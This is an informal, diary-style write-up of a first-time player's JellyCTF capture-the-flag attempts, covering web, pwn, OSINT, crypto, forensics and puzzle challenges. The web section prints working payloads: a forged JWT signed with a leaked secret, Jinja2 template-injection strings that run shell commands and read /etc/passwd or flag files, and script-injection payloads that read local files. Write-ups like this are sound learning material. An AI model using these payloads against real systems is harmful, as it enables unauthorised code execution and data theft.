+++
title = 'JellyCTF Writeup'
date = 2025-01-22T10:39:54Z
+++
# Foreword

This document was written in Google docs and converted to HTML, as a result the CSS is kind of bad and ugly. Google Docs is state-of-the-art when it comes to collaborative editing but it’s not the only program with state-of-the-art collaborative editing and these kinds of rich text editors are starting to feel more and more like a relic now that WYSIWYG markdown editors have gotten so good. Things that are extremely easy in markdown are annoying and fiddly in Docs even with the best tools available and the freedom you get in return is mostly the freedom to make your document look ugly and have a bunch of hidden formatting that confuses new and experienced users alike. Next time around I will probably try to use something else, but this is what we have to work with for now.

Also, this document is informal, and sort of in the format of a diary. It’s also not in chronological order (which is sometimes confusing). In the spirit of the contest I wanted this to be fun to read, particularly for myself and my teammate. It contains rambles, asides, and rants, and some of the challenges simply trail off because I couldn’t solve them. This was also my first CTF and I joined it more-or-less on whim the day I found out about it, so there may be some CTF etiquette I’m missing. I don’t particularly care; I had a great time regardless.

> A huge thank you to the event organizers for all their hard work. I could hardly have asked for a better introduction to CTF-ing. I only wish I’d had more time to participate.

---

# Web

---

# Do\_not\_trust

> there's a flag hidden somewhere on this site (jellyc.tf) in a common location for websites, see if you can find it

First I figured I’d check the cookies and local storage. Nothing there except essential stuff

![](images/image31.pngimages/image7.png)

> Oops I leaked my session cookie.

Next I tried sitemap.xml: 404\.

The search on firefox devtools doesn’t seem to search all files, which is pretty disappointing. For example, a lot of the site is generated dynamically from json, and the content of those json files is not searched.

Ah okay, robots.txt.

| User-agent: \*Disallow: /\# jellyCTF{g0d\_d4mn\_cL4nk3r5} |
| :---- |

# Vlookup\_hot\_singles

![](images/image14.png)

> I gotta try this one

We gotta get to the admin page.

![](images/image28.png)

| def is\_admin(token):    data \= jwt.decode(token, JWT\_SECRET, algorithms=\["HS256"\])    return data\["user"\] \== "jelly"  |
| :---- |

Here is the code we need to bypass. It took me a little while to figure out it’s actually easier than I thought:  
I don’t have to reverse a hash, and it’s not using any form of asymmetric cryptography. In fact, here is the code that encrypts the token.

| resp.set\_cookie('token', jwt.encode({"user":"starknight"}, JWT\_SECRET, algorithm="HS256"))  |
| :---- |

And that `JWT_SECRET`, however secure it may look with it’s all caps, is just a variable in the file. So all we should have to do is change “user” to “jelly” and it should work . Here is a super basic piece of code that should do the trick.

| import jwtjwt.encode({"user":"jelly"}, "singaQu5aeWoh1vuoJuD\]ooJ9aeh2soh", algorithm="HS256") |
| :---- |

This is where it all falls apart: I’m doing this with my partner and I’m using Gentoo (a horribly broken operating system), and he’s using WIndows 11 (a horribly broken operating system) and so, neither of us are capable of installing a basic dependency despite exhausting seemingly all our available methods.

For me, portage is currently in a broken state since it can’t figure out an upgrade path from python 3.11 to python 3.12, so I can’t install Pipenv or any other packages that rely on the latest Python. Venv doesn’t work as advertised because blah blah blah.

![](images/image44.png)

> A peek into the daily life of a Gentoo user

![](images/image39.png)

> A peek into the twisted mind of a Windows 11 user

Anyway we both got it working eventually. Turns out I was trying to install `jwt` when the package was called `pyjwt`. That’s a pet peeve of mine; packages that have a different name from the name of the library or executable. It seems to plague Python in particular with all the cute names people love to come up with for their projects that are impractical to type. Anyway here’s the solution

### `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.7wQ41K0c7OZqWaePlf3v0QKuX-jOc4kFqks_eWrfQhE`

Just need to set the “token” cookie to this value in our browser and we’re golden freddy..

![](images/image12.png)

# bro\_visited\_his\_site

# ![](images/image45.png)

We have a webpage and it allows HTML injection. There is a flag.txt in the root of the project, but the webserver is configured to only serve static files from the /static directory, so it doesn’t look like I’ll be able to access that file. Alternatively., the flag is present in the flask config. I’ll have to look up what exactly that means.

| app.config\["FLAG"\] \= "jellyCTF{redacted}" |
| :---- |

| 	return render\_template\_string(f'''    	{{</* % set config="friend" % */>}}    	{{</* % set self="visit" % */>}}    	\<p\>        	{word}pilled {word}maxxer    	\</p\>	''') |
| :---- |

It looks like this challenge relies on code injection into the template. I quick search for “flask code injection” reveals that it is surprisingly simple:

| {{</* app.config\["FLAG"\] */>}} |
| :---- |

# ![](images/image11.png)

A stacktrace\! It’s not the flag but it’s more than I was expecting. I can’t access `app` from Jinja2 templates. I also can’t access `self` or `config` because those two variables have cleverly been set to strings. Anyway, that’s not how we’re going to do it. Reading a little more about the [flask injection vulnerability](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/) I get a chunk of code that looks like this

| {{</* 'abc'.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()\[92\].\_\_subclasses\_\_()\[0\].\_\_subclasses\_\_()\[0\]('/etc/passwd').read() */>}} |
| :---- |

What a beautiful language Python is. I’ve done goofy stuff with Python before it’s not surprising to me that you can get to a shell from a string class. Unfortunately, this code doesn’t work: It turns out hardcoded index arrays into the nuts and bolts of language natives don’t always stand the test of time. Fixing it is a little tricky because the exact exploit depends on specifics of the Python environment, but luckily we are given a lot of freedom. Firstly we can list all the possible subclasses to exploit with

| {{</* 'abc'.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() */>}} |
| :---- |

This gives about 500 elements to search through. I believe what I’m looking for is `os` which allows me to run commands. And element `141` is `os._wrap_close` which is where I’ll start, but the next step is unclear.

There is still a lot about this vulnerability I don’t understand so I figured I’d read the article a little more carefully, and it turns out there’s a much easier vulnerability:

| {{</* request.application.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_('os').popen('cat flag.txt').read() */>}} |
| :---- |

# ![](images/image24.png)

Awesome\! We have out flag. Except it turns out I jumped the gun. If I’d read the prompt more carefully I would have understood that there are two different keys and this one is actually the answer for part 2\. Thankfully, this solution lets me print the source code for the server to cheat at part 1\.

![](images/image21.png)

# Awafy\_me

> Hacked this together for Jelly's mutually beneficial partnership application

## [*https://awafy-me.jellyc.tf/*](https://awafy-me.jellyc.tf/)

![](images/image35.png)

Wow, that’s alien for hello? I’ll have to remember that for next time.

Anyway, this one’s actually very simple: It’s a Python program and it executes unsanitized user input on the shell.

| result \= subprocess.check\_output("python3 ./awafier.py " \+ user\_input, shell=True)  |
| :---- |

![](images/image4.png)

> I later figured out how to remove my cursor from screenshots

# Pentest\_on\_stream

For this one. I have to pwn without access to the source code. Which is a little trickier for me. I tried a message with some possible attacks off the top of my head and we see some interesting stuff.

![](images/image8.png)

My next step is to try and use javascript to edit the message body.

![](images/image22.png)

Very cool\! But how do I get the token? My first guess is to try and get as much info as we possible can with JSON.stringify(document)

 ![](images/image53.jpg)

One little problem: it gives me back an image. It’s kind of clever actually, I wonder how they do it. But regardless, I’ll need to filter the input from the payload, there’s no way to get a dump of all the site data without doing something a little more complicated and perhaps naughty. Also, JSON.stringify actually gives me way less data and just using innerHTML is probably the way to go.

Here’s the next payload:

| I'm a big fan\!\<script\>document.body.innerHTML \= document.body.innerHTML.search("jellyCTF")\</script\> |
| :---- |

And the result:

![](images/image54.jpg)

Okay, so that’s the index. What I really want is the string.

| I'm a big fan\!\<script\>document.body.innerHTML \= document.body.innerHTML.slice(180)\</script\> |
| :---- |

![](images/image50.jpg)

Weird. I don’t know what to make of that. Really I should be using a regular expression though

| I'm a big fan\!\<script\>document.body.innerHTML \= document.body.innerHTML.match("jellyCTF\\{.\*\\}")\[0\]\</script\> |
| :---- |

![](images/image36.jpg)

It didn’t work. That probably means that the javascript didn’t execute because there was an error which probably means the regex failed to find a match.. Let’s try something else:

| \<pre id=this1\>hello\</pre\>\<script\>document.getElementById("this1").innerHTML \= document.body.innerHTML.slice(document.body.innerHTML.search("jellyCTF"))\</script\> |
| :---- |

![](images/image46.jpg)

At this point I finally realized that the positive match I initially found was matching the actual javascript which performed the search, and there was no flag in the page. I feel like I don’t have a clue what’s going on, and the prompt says I should try to understand what’s going on in the site, so let’s see what we can learn.

| \<pre id=this1\>hello\</pre\>\<script\>let o \= document.all; //this was leftover from some other experimentslet s \= window.location.hrefdocument.body.innerHTML \= s\</script\> |
| :---- |

![](images/image52.jpg)

We might be getting somewhere. Let’s see if we can go to another page on the webroot.

| \<iframe src="http://absolute/"\>\</iframe\> |
| :---- |

![](images/image6.jpg)

No dice\! I was hoping for some sort of automatically generated directory view.

| \<iframe src="http://absolute//app/chat.html"\>\</iframe\> |
| :---- |

![](images/image15.jpg)

But hey, that’s kind of funny, right? I suppose I could try looking for flag.txt. 

![](images/image43.png)

> I missing clue perhaps?

Yeah okay I was wrong. This is like any other challenge; we get the source code because otherwise it puts too much strain on the servers. Sorry servers. Anyway, now that I have the source code I can see how it all works and it's pretty cool. Turns out OBS is the thing that screenshots the webpage. As for what my target could be, there are some option:

OBS, maybe steal some data like a stream key?  
Valkey, there might be something good in there, but it seems like it’s just something Flask uses to implement rate limiting.

After a bit of grepping I found the key was in an OBS scene. That tells me that there is probably an OBS-specific exploit I need to perform.

At this point I finally understood something that had puzzled me; the meaning of `absolute`. The screenshots we get back from using the OBS library are not actually of pages on the flask webserver like I’d assumed, instead the browser used with OBS is just opening files and viewing them and “absolute” is the project root. So we have some degree of access to a program that can open and read arbitrary files and send info back to us.

At this point it seemed like we were as good as done. But it was not so simple: Firstly, I tried simply using an iframe. It had worked before so maybe now that I know the actual path to the file we can get somewhere.

| \<iframe src="http://absolute//obs-studio/basic/scenes/scenes.json"\>\</iframe\> |
| :---- |

![](images/image6.jpg)

Nothing, but maybe iframes don’t work on json. Next thing I tried was this payload which was actually mostly nicked from the Cherry challenge later on, a lot of great code snippets came out of this.

| \<script\>fetch('http://absolute//obs-studio/basic/scenes/scenes.json').then(response \=\> response.text()).then(text \=\> {  document.body.innerHTML \= text.match('jellyCTF\\{.\*\\}')})\</script\> |
| :---- |

This failed to do anything at all. I guessed at the time that this javascript may simply not be implemented in the webkit that OBS uses but I think it probably failed for the same reason the above failed. At this point I would have had to go to the web to find the exploit which is usually where I lose interest.

---

# pwn

---

# Phase\_coffee\_1

The Dockerfile scared us off initially, but it’s actually not that complicated, and you can run it locally no problem. It's a menu tree, evocative of old pre-internet phone trees that used to be everywhere.

![](images/image9.png)

Anyway, I edited the source code and gave myself `MAXINT` money. Let’s see what I can buy.

![](images/image37.png)

Yeah okay not that surprising. It just reads the content of flag.txt. Which isn’t the answer :(

Maybe some of those arguments after the EXEC transform the text in some way. It’s the only thing in there that looks interesting.

| `ENTRYPOINT ["socat", "-dd", "TCP4-LISTEN:5000,fork,reuseaddr", "EXEC:./main,pty,echo=0,raw,iexten=0"]`  |
| :---- |

 It’s doubtful, though. The flag.txt is 8 bytes long, there’s pretty much no way to interpret it differently as far as I can imagine, but let’s give it a shot.

![](images/image18.png)

> Alright I give up, Docker sux.

Let me double check that I haven’t missed anything.

![](images/image40.png)

#### I missed something

Yeah, that makes a lot more sense. I’m supposed to pwn a running instance where I can’t read the key from a text file, and I can’t edit the source code to give myself `MAXINT` money or just remove all code paths except the part that gives me the key. This should be interesting. Let’s skip to the source code:

If I want that amazing coffee, this has to be true:

| if (coin\_balance \>= 1000000)  |
| :---- |

Which means this statement has to increase my balance:

| coin\_balance \= coin\_balance \- total\_cost;  |
| :---- |

Which means total cost has to be negative, which means quantity has to be negative

| int total\_cost \= 35 \* quantity;  |
| :---- |

Which finally brings us to a variable that we can control.

| scanf("%d", \&quantity);  |
| :---- |
cAnd that should be all we need:

![](images/image19.png)

> Boom, get pwned

---

# OSInt

---

# Stalknights\_1

> Stumbled across this Starknight while scrolling through Instagram. Can you figure out what neighbourhood and country this photo was taken in?

![](images/image56.jpg)

Where was this photo taken? Thankfully Google reverse image search, or *“Lens”,* is still good enough to find images.

### `jellyCTF{zaanse_schans,netherlands}`

# Stalknights\_2

> **starknight1337** shared another photo on their Instagram. What is the name of the park where the photo was taken?

![](images/image5.jpg)

This one’s a little tougher because it has a bunch of stuff superimposed on the image. The Bikes visible are *Tier* bikes. That narrows it down to these locations.![](images/image30.png)

## [*https://www.tier.app/en/where-to-find-us*](https://www.tier.app/en/where-to-find-us)

![](images/image17.png)

ATLANTIC PIZZA? (28)?

![](images/image25.png)

Bright Festival, what’s that? Going to google images and looking for a “Bright Festival” with the same logo, I find this:

![](images/image10.png)

Brussels is fitting. It is the waffle capital of the world after all. A bit of Geoguessing later and we have our answer:

![](images/image32.png)

### `jellyCTF{square de la putterie}`

# Stalknights\_3

OwO, what’s this?

## ![](images/image23.png)

This plane is called the **Eevee Jet**, its flight number is **JA784A.** We need to find out where it was on **May 3rd 2024**. A little bit of googling revealed [adsbexchange.com](http://adsbexchange.com), a cool and completely free interactive flight map with full history. Between May 2nd and May 3rd UTC, this plane was on the flight path **ANA160.**

![](images/image16.png)

It would have touched down at 2am in New York before returning to Tokyo. So our answer is:

### `jellyCTF{New York City, United States}`

# Further Stalking

![](images/image1.png)

![](images/image27.png)

> Atlas search ftw

[https://github.com/starknight1337/rustlings\_practice](https://github.com/starknight1337/rustlings_practice)

There’s got to be something juicy here

![](images/image2.png)

This repo is a fork of rust-lang/rustlings \- “🦀 Small exercises to get you used to reading and writing Rust code\!”. All commits before these are from the original repo. Unfortunately git push \--force really does seem to purge git history, at least on the remote and all of its clones. I used `git fsck --full --no-reflogs --unreachable --lost-found` which finds everything and it found nothing. I had some other leads for places on GitHub where the info might be but it ultimately led nowhere.

---

# Crypto

---

# cherry

![](images/image49.png)

This is a crypto puzzle. The idea is to read the source code and figure out what the plaintext would be with triple cherries. Except, this is javascript. I could just open the console and set the slots to cherries. Let’s try that.

![](images/image34.png)

Playing around with the source code, here’s what I learned: if `slotIndices` is `[0,0,0]` that’s all cherries and we win, however the plaintext is what we’re after and that’s not controlled by `slotIndices` it’s controlled by `spinCounts`, which tracks how many spins have been performed in each respective “play coin” mode. `slotSpins` can be one of either `[19,22,19]`, `[32,27,29]`, or `[347,349,353]` depending on the “play coin” option, these are all prime numbers.

What it comes down to is this: We need to figure out what sequence of moves gets us to the desired state. We have three possible starting points, and three possible moves. The desired state is to get all three slot Indices to add up to 32768, which will then overflow to 0\. There are theoretically infinite possible solutions if we allow overflowing multiple times, maybe multiple solutions even if we don’t. We should probably assume the shortest solution is the correct one.

At this point I was about to get started on game tree search and I almost forgot about the associative property of addition. We don’t actually need to work through all possible moves, we just need to work through all reasonable values of `spinCounts`

 So without further ado, I started writing code.

```c++
#include <stdio.h`
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
 
const int m = 32768;
 
typedef int i3[3];
const i3 starting_positions[3] = {{</* 10992, 30978, 12520 }, {30983,  7390,   481}, {25974, 26744,  9122 */>}};
i3 moves[3] = {</* { 19,  22,  19}, { 32,  27,  29}, {347, 349, 353} */>};
 
#define FOR3 for(int i=0; i<3; i++)
#define JFOR3 for(int j=0; j<3; j++)
#define COPY_OF(I3) {I3[0],I3[1],I3[2]}
 
void i_add (i3 a, i3 b) {
	FOR3 a[i] += b[i];
}
 
void i_mul (i3 a, int b) {
	FOR3 a[i] *= b;
}
 
int* copy (i3 a) {
	int* out = malloc(sizeof(i3));
	FOR3 out[i] = a[i];
	return out;
}
 
void print(i3 a) {
	printf( "%d,%d,%dn", a[0], a[1], a[2]) ;
}
void labelled_print(char* s, i3 a) {
	printf("%s %d,%d,%dn", s, a[0], a[1], a[2]);
}
 
int* evaluate_spinCounts(i3 spinCounts) {
	int* a0 = copy(moves[0]);
	i3 a1 = COPY_OF(moves[1]);
	i3 a2 = COPY_OF(moves[2]);
 
	i_mul(a0, spinCounts[0]);
	i_mul(a1, spinCounts[1]);
	i_mul(a2, spinCounts[2]);
 
	i_add(a0, a1);
	i_add(a0, a2);
 
	return a0;
}
 
#define st starting_positions
i3 targets[3] = {
	{m - st[0][0], m - st[0][1], m - st[0][2]},
	{m - st[0][0], m - st[0][1], m - st[0][2]},
	{m - st[0][0], m - st[0][1], m - st[0][2]}
};
#undef  st
bool less_than_targets(i3 a) {
	JFOR3 {
    	FOR3 if(a[j] > targets[j][i]) return false;  
	}
	return  true;
}
 
 
int main(void) {
	i3 spinCounts = {0,0,0};
	int* result = evaluate_spinCounts(spinCounts);
	while(less_than_targets(result)) {
    	print(result);
    	spinCounts[result[0] % 3] ++;
    	result = evaluate_spinCounts(spinCounts);
	}
	print(result);
	print(spinCounts);
}
```

I chose C for this task which was most certainly the wrong choice. In typical fashion I began by spending the better part of an hour creating data structures and helper functions, and I lost some time to a strange error caused by memory corruption because I forgor to initialize my values 💀. I chose C because I thought I would have to worry about performance and memory complexity for this problem, but I was probably wrong and it didn’t ultimately matter because I ran out of time before I got as far as even being able to explore the problem.

C is still an awesome language, it’s especially fun to refactor and optimize C because you can really get huge value out of understanding how it works, but it was pure pain using it here.

---

# Forensics

---

# Alien\_transmission

![](images/image51.png)

> Yeah, we all know this one. right?

# the\_REAL\_truth![](images/image47.png)

> There is a secret hidden somewhere on this page.

The choice to use Carrd is a little surprising. This is, after all, almost as simple of a webpage as you could hope to make. Maybe there’s more to this decision than I realize.

`  \<section id="section02-section" class="inactive" style="display: none;"\>\<p id="text02"\>i'm not paying for carrd, you'll have to deal with the footer lol\</p\>\</section\> `
| :---- |

The HTML actually does contain a hidden message, but it’s not that interesting. What we’re after is this:![](images/image13.png)

See that noise in the image? I’m pretty sure there’s a message hidden in there. The process of hiding text in images is called **Image Steganography**. That frame around the image worries me somewhat; I hope I don’t have to remove it, because I’m not sure I’d know how to do that while preserving the message.

There’s a Python library called *pillow* that can do steganography so I may as well try that first. I stole some code from [GeeksForGeeks](https://www.geeksforgeeks.org/image-steganography-in-cryptography/) and slapped a command-line interface on it.

| \#\!/usr/bin/env pythonfrom PIL import Imageimport sysdef extract\_text(image\_path):	\# Open the image	image \= Image.open(image\_path) 	\# Extract the secret text from the image	pixels \= image.load()	binary\_secret\_text \= ""	for i in range(image.width):    	for j in range(image.height):        	r, g, b \= pixels\[i, j\]         	\# Extract the least significant bit of each color channel        	binary\_secret\_text \+= str(r & 1)        	binary\_secret\_text \+= str(g & 1)        	binary\_secret\_text \+= str(b & 1) 	\# Convert the binary text to ASCII	secret\_text \= ""	for i in range(0, len(binary\_secret\_text), 8):    	char \= chr(int(binary\_secret\_text\[i:i+8\], 2))    	secret\_text \+= char 	return secret\_textif \_\_name\_\_ \== "\_\_main\_\_":	for s in sys.argv\[1:\]:    	print(extract\_text(s)) |
| :---- |

Alright, here goes:

![](images/image48.gif)

It’s just nonsense. I tried grepping and everything. Though thinking about it, it would be crazy if it actually worked, considering this is just an example of one way you could hide a message in an image. At  this point I am now thinking about all the things I don’t know, so I’ll start by trying to encode my own message in my own image and compare that to the one I was given. To GIMP\!

![](images/image33.gif)

After expanding my script and fixing surprisingly many bugs, some of which weren’t even mine, here is an image with some text encoded into it.

![](images/image38.png)

#### I wonder what she’s thinking about…

It was a pretty big body of text, and it looks exactly the same. That’s because this method prepends the data to the image, rather than mixing it in somehow. So we’re dealing with something very different. I don’t fancy my chances to reverse-engineer this encoding, and hoping to stumble on an answer through the web isn’t my cuppa so I’ll move on for now.

---

# Misc.

---

# This\_is\_canon

![](images/image3.jpg)

| `(0,0,4,3,7,6) (_,e,l,y,j,o,r,a,c,d,s,t,u,w,f,h,k,m,{,}) 1000001010010011101111101011101011111010000010100100110000111001110111010000111011100111110100111100100110101111000001110010110110010001100011011001000011001110011101000110101100010110011111111`  |
| :---- |

The image is pretty useful. I might not have figured out what this was supposed to be without it. That said, figuring out this joke is its own puzzle. Nothing salient on Wikipedia for [Canon](https://en.wikipedia.org/wiki/Canon). I think maybe the name refers to tree canonization. The joke, I’m guessing, is a reference to this.  
![https://i.imgur.com/Ot9xvxh.jpeg](images/image55.jpg)  
With “fanon” meaning *femanon* or *female anon.*

Edit: Some ancient knowledge got unearthed in my brain and I remembered that this is fanfiction lingo and not some extradimensional hyperjoke from the future.

Anyway, I recognise what this is, or atleast, I recognise something like it: **Huffman Coding**, a text compression algorithm.  
[How Computers Compress Text: Huffman Coding and Huffman Trees](https://www.youtube.com/watch?v=JsTptu56GM8)  
Except that first line \- (0,0,4,3,7,6) \- it doesn’t seem like enough data to construct a Huffman Tree. It’s possible that we have to make a partial Huffman tree and use statistics to do the rest, except this is a much harder problem than a substitution cipher because we don’t actually know how many bits get assigned to each character.

# Is\_jelly\_stuck

![](images/image26.png)

> We got a crossword, very cool.

| The flag is complete gibberish, but you'll know it when you're optimal\!ACROSS    1    Ancient "rose-red city"6    Running off current9    Statute12    Remi, Airi, Shiina, Rie, Erina, Panko13    Sci-fi star knight circa 197714    New Phase branch, maybe15    Minivan alternative, abbr.16    Lists files in the current directory17    Jelly is22    Jelly is also a23    This, backwards24    Roman blackjack?DOWN    1    Basic projectile and legume2    Letter, Jelly only takes3    Last name of developer, released a free beta on itch.io needed to solve this challenge4    Color TV pioneer5    Between ports7    ... to ay resects8    ... you?9    Yellow, left-to-right top-to-bottom, code10    Commonly blocked11    Dorian Gray creator13    Court panel15    Co. that purchased AT\&T in 200517    Package delivery co. ticker symbol18    Smoked salmon for breakfast19    Killing your teammate, abbr.20    What's that noise? Did someone \_\_ me?21    Yankovic |
| :---- |

Turns out ChatGPT is a crossword machine. I thought “Dorian Gray Creator” was E.L. James. Shows how literate I am.

![](images/image42.png)

Well I didn’t quite understand all of the clues, but everything checks out.![](images/image41.png)

### `jellyCTF{kroddaerbasatalf}`

Except, there’s something missing. That *“Last name of developer, released a free beta on itch.io needed to solve this challenge”* clue tells me there’s more work to be done. Well, that and the fact that the above code doesn’t, and and one of the clue descriptions is “I know what to do with the code and solved the thing it leads to. Why isn't the flag working? Where is the flag?”. So, we’ve got to find that thing on itch.io.

![](images/image29.png)

> Wow, really stellar work, ChatGPT.

I think at this point trying random letters will get me there faster. I will cut out the embarrassing segment where I mistook the uppercase I for a lowercase L, just like I thought I would when I first wrote it.

![](images/image20.gif)

> Another dead end, I think.

Thankfully for the low price of 15 points, I can simply be [told what to do](https://hempuli.itch.io/baba-is-you-level-editor-beta). It’s an old version of the Baba is You level editor. There’s nowhere to put the key, so we have to be a little more creative.

Running the game from a terminal window, I notice some interesting stuff.

| babahttp\_download: https://8778eno8ha.execute-api.eu-central-1.amazonaws.com/prod/list\_levels2?category=featured\&page=36babahttp\_download: https://babalevels3.s3.eu-central-1.amazonaws.com/9R9U-RXRK.pngbabahttp\_download: https://babalevels3.s3.eu-central-1.amazonaws.com/44EI-DGJ5.pngbabahttp\_download: https://babalevels3.s3.eu-central-1.amazonaws.com/9FZK-2YH7.pngbabahttp\_download: https://babalevels3.s3.eu-central-1.amazonaws.com/NVYI-7PDX.pngbabahttp\_download: https://babalevels3.s3.eu-central-1.amazonaws.com/TL42-MAFW.pngbabahttp\_download: https://babalevels3.s3.eu-central-1.amazonaws.com/MKIE-6HKJ.pngNo INI cache found for ./temp/MKIE\-6HKJ.pngNo INI cache found for ./temp/9R9U-RXRK.pngNo INI cache found for ./temp/9FZK\-2YH7.pngNo INI cache found for ./temp/TL42-MAFW.pngNo INI cache found for ./temp/NVYI\-7PDX.pngNo INI cache found for ./temp/44EI-DGJ5.png |
| :---- |

It downloads the levels from the web, and each one has one of these 8-character alphanumeric codes attached to them. The flag I got from the crossword happens to be 16 characters.

![](images/image31.png)

Unfortunately, `KROD-DAER` and `BASA-TALF` are not valid level codes. I’ve also learned that the codes are case sensitive despite all being uppercase, and the hyphen is required.  It’s also worth remembering that `kroddaerbasatalf` is not just a random string of letters, so it’s unlikely to be used as a UUID anywhere that doesn’t let you set a custom one.

I tried using `name=` instead of `level=` to try and find a known level based on its name, no dice. This tells me the following things:

- I need to get a Baba is You level using the above code  
- It’s probably not related to the level code since the code is random  
- You can only find levels on the official host using a code, so the level probably isn’t there  
- Even if the event organizers managed to get a hold of Arvi and get him to put a secret into to demo, it hasn’t been updated since 2022, so we can probably rule that out.  
- So either the level code or the level itself must be somewhere else and I need to find it.
